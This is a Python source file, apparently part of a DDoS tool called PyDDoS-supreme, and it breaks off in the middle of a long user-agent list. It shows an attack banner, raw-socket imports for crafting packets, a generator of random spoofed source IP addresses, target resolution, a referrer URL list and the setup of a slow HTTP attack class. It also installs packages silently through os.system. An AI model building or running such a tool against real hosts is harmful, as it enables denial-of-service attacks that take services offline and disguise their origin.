# Banner function
def show_banner():
    banner = r"""
version = '1.0'

	 ██▓███ ▓██   ██▓▓█████▄ ▓█████▄  ▒█████    ██████ 
	▓██░  ██▒▒██  ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
	▓██░ ██▓▒ ▒██ ██░░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
	▒██▄█▓▒ ▒ ░ ▐██▓░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
	▒██▒ ░  ░ ░ ██▒▓░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
	▒▓▒░ ░  ░  ██▒▒▒  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
	░▒ ░     ▓██ ░▒░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
	░░       ▒ ▒ ░░   ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
	         ░ ░        ░       ░        ░ ░        ░  
	         ░ ░      ░       ░                        

	DDos python script | Script used for testing ddos | Ddos attack
	Author: DirtyHeroes
	Github: https://github.com/palacita135/PyDDoS-supreme

	root@kali: python3 pyddos.py --help <for option>

"""
    print(banner)

# Ensure this runs before parsing arguments
show_banner()

import urllib.parse
import http.client
import random
import argparse
import signal
import string
import time
import json
import sys
import os
import re
import shutil
import struct
import threading
from fake_useragent import UserAgent
from collections import defaultdict  # ✅ Correct import
from termcolor import cprint
from argparse import ArgumentParser, RawTextHelpFormatter
from socket import socket, inet_aton, AF_INET, SOCK_RAW, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL, gethostbyname
from threading import Thread, Lock
from struct import pack
from random import randrange

some_dict = defaultdict(list)
some_dict['key'].append('value')
print(some_dict)  # Output: {'key': ['value']}

# Check if pip is installed and upgrade it if needed
if not shutil.which("pip"):
    os.system("python3 -m ensurepip && python3 -m pip install --upgrade pip")

# Try to import necessary modules
try:
    import requests
    import colorama
    from termcolor import colored, cprint
except ImportError:
    print("[!] Missing dependencies. Installing now...")

    try:
        os.system('pip install --upgrade colorama termcolor requests')

        print("[+] Installed necessary modules. Restart the script.")
        sys.exit(0)

    except Exception as e:
        print(f"[-] Installation failed: {e}")
        sys.exit(1)

# Initialize colorama for color support
colorama.init()

def fake_ip():
    """Generate a random, non-loopback IP address."""
    while True:
        ip_parts = [str(randrange(0, 256)) for _ in range(4)]
        if ip_parts[0] != "127":  # Avoid loopback IPs
            return ".".join(ip_parts)

def check_tgt(args):
    """Resolve target hostname to IP address."""
    try:
        return gethostbyname(args.d)
    except Exception:
        sys.exit(cprint("[-] Can't resolve host: Unknown host!", "red"))

def add_useragent():
    """Load User-Agent strings from a file."""
    useragent_file = "/home/whoami/Pyddos/ua.txt"
    try:
        with open(useragent_file, "r") as fp:
            return [line.strip() for line in fp if line.strip()]
    except FileNotFoundError:
        cprint("[-] No file named 'ua.txt', failed to load User-Agents", "yellow")
        return []  # Return empty list if file not found

def add_bots():
    """Return a list of bot search engine URLs."""
    return [
        # Legitimate Search Engine Bots
        "http://www.bing.com/search?q=%40&count=50&first=0",
        "http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8",
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.yahoo.com/",
        "https://www.duckduckgo.com/",
        
        # Malicious Botnets & Crawlers
        "https://www.shodan.io/robots.txt",  # Shodan Scanner
        "https://www.zoomeye.org/faq",  # ZoomEye (Chinese Recon Scanner)
        "https://www.binaryedge.io/",  # BinaryEdge (Recon & Intelligence)
        "https://fofa.info/",  # FOFA Scanner (Chinese OSINT)
        "https://www.onyphe.io/",  # Onyphe (Cyber Threat Intelligence)
        
        # DDoS & Malicious Botnets
        "https://en.wikipedia.org/wiki/Mirai_(malware)",  # Mirai Botnet
        "https://en.wikipedia.org/wiki/Mozi_botnet",  # Mozi P2P Botnet
        "https://en.wikipedia.org/wiki/IoT_Reaper",  # Reaper (Advanced Mirai)
        "https://en.wikipedia.org/wiki/Mercedes_DDoS",  # Meris Botnet
        "https://www.cloudflare.com/learning/ddos/glossary/mylobot/",  # MyloBot
        "https://www.kaspersky.com/blog/malicious-socks5-proxies/36190/",  # SOCKS Proxy Botnets
        
        # Vulnerability Scanners & Exploitation Frameworks
        "https://nmap.org/nsedoc/",  # Nmap NSE Scripts
        "https://www.metasploit.com/",  # Metasploit Exploitation Framework
        "https://cirt.net/nikto2",  # Nikto Web Scanner
        "https://wapiti.sourceforge.io/",  # Wapiti Web Vulnerability Scanner
        "https://sqlmap.org/",  # SQL Injection Scanner
        "https://github.com/commixproject/commix",  # Command Injection Scanner
        
        # Brute Force & Credential Stuffing Bots
        "https://github.com/vanhauser-thc/thc-hydra",  # Hydra (Brute Forcer)
        "https://github.com/galkan/crowbar",  # Crowbar (SSH & RDP Brute Force)
        "https://github.com/lanjelot/patator",  # Patator Brute Force Suite
        
        # DDoS Attack Tools
        "https://en.wikipedia.org/wiki/LOIC",  # LOIC (Low Orbit Ion Cannon)
        "https://en.wikipedia.org/wiki/HOIC",  # HOIC (High Orbit Ion Cannon)
        "https://github.com/gkbrk/slowloris",  # Slowloris HTTP DoS Tool
        "https://github.com/grafov/hulk",  # HULK (HTTP Unbearable Load King)
        "https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project",  # DirBuster (Brute Force Directories)
    ]

class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep):
        dst_ip = str(tgt)
        self.port = int(port)  # Ensure port is an integer
        self.to = float(to)  # Timeout should be a float
        self.threads = int(threads)  # Ensure threads is an integer
        self.sleep = float(sleep)  # Sleep should be a float
        
        self.method = ['GET', 'POST']
        self.pkt_count = 0  # Packet counter
        
        # Optionally, include a predefined User-Agent list
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (Linux; Android 10; Mobile)",
            "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6",
            "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
            "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
            "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)",
            "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20130514 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
            "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
            "Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
            "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; tr-TR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
            "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0)  Gecko/20100101 Firefox/18.0",
            "Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17",
            "Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
            "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
            "Mozilla/5.0 (Windows x86; rv:19.0) Gecko/20100101 Firefox/19.0",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; hu-HU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
            "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
            "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15",
            "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; ar) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
            "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
            "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",
            "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
            "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/19.0",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ko-kr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Microsoft Windows NT 6.2.9200.0); rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-HK) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
            "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; zh-cn) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/18.0.1",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; fr-FR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; es-es) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-ch) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
            "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)",
